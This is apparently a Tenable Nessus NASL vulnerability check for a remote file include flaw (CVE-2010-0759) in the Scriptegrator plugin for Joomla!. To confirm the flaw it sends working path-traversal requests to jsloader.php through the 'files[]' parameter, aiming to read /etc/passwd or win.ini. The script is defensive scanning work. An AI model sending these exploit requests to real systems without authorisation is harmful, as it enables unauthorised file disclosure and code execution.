#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(44674);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2010-0759");
  script_bugtraq_id(38296);
  script_osvdb_id(62406);
  script_xref(name:"EDB-ID", value:"11498");

  script_name(english:"Scriptegrator Plugin for Joomla! 'files[]' Parameter Remote File Include");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Core Design Scriptegrator plugin for Joomla!
running on the remote host is affected by a remote file include
vulnerability due to improper sanitization of user-supplied input to
the 'files[]' parameter before using it in the
cdscriptegrator/libraries/highslide/js/jsloader.php script to include
PHP code. Regardless of the PHP 'register_globals' setting, an
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"https://extensions.joomla.org/extension/core-design-scriptegrator");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Scriptegrator version 1.4.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/02/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/02/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Scriptegrator";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>(System - )?(Core Design )?Scriptegrator plugin<');
  checks["/mambots/system/cd_scriptegrator.xml"]=regexes; # Joomla 1.0.x
  checks["/plugins/system/cdscriptegrator.xml"]=regexes; # Joomla 1.5.x

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

vuln = FALSE;
error = FALSE;

urls = make_list("/plugins/system/cdscriptegrator", "/plugins/system/cd_scriptegrator");

# Loop through files to look for.
foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') exploit = file;
  else exploit = crap(data:"../", length:3*6) + file;

  foreach url (urls)
  {
    url += "/libraries/highslide/js/jsloader.php?files[]=" + exploit;

    res = http_send_recv3(
      port   : port,
      method : "GET",
      item   : dir+url,
      exit_on_fail : TRUE
    );

    # There's a problem if we see the expected contents.
    res = res[2];

    if (egrep(pattern:file_pats[file], string:res))
    {
      vuln = TRUE;
      contents = res;
      break;
    }
    # we get an error claiming the file doesn't exist
    else if (
      "): failed to open stream: No such file" >< res ||
      "[function.include]: failed to open stream: No such file" >< res
    )
    {
      vuln = TRUE;
      error = TRUE;
      contents = strstr(res, file);
      break;
    }
    # we get an error about open_basedir restriction.
    else if ("open_basedir restriction in effect" >< res)
    {
      vuln = TRUE;
      error = TRUE;
      contents = strstr(res, "open_basedir");
      break;
    }
  }
}
if (vuln)
{
  if (error)
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : contents,
      rep_extra   :
       'Note that Nessus was not able to directly exploit this issue;'+
       '\nhowever, based on the error below, the install does appear to be'+
       '\naffected.'
    );
    exit(0);
  }
  if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(install_url + url),
    output      : chomp(contents),
    attach_type : 'text/plain'
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
